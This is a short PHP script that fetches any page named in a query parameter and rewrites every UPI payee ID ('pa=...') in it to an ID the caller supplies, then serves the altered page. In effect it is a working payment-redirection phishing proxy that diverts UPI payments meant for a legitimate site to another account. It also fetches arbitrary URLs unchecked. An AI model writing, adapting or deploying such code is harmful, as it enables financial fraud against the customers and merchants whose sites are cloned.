<?php
// Step 1: Get URL and new UPI from query
$target = $_GET['url'] ?? '';
$newUPI = $_GET['pa'] ?? '';

// Step 2: Validate input
if (!$target || !filter_var($target, FILTER_VALIDATE_URL)) {
    die("Invalid or missing target URL.");
}
if (!$newUPI || strpos($newUPI, '@') === false) {
    die("Invalid or missing new UPI ID.");
}

// Step 3: Fetch content from target
$context = stream_context_create([
    'http' => ['header' => "User-Agent: Mozilla/5.0\r\n"]
]);
$html = @file_get_contents($target, false, $context);

if (!$html) {
    die("Failed to load target site.");
}

// Step 4: Replace all UPI IDs (basic version)
$html = preg_replace('/pa=[a-zA-Z0-9.\-_]+@[\w]+/', 'pa=' . $newUPI, $html);

// Step 5: Output modified site
echo $html;
?>
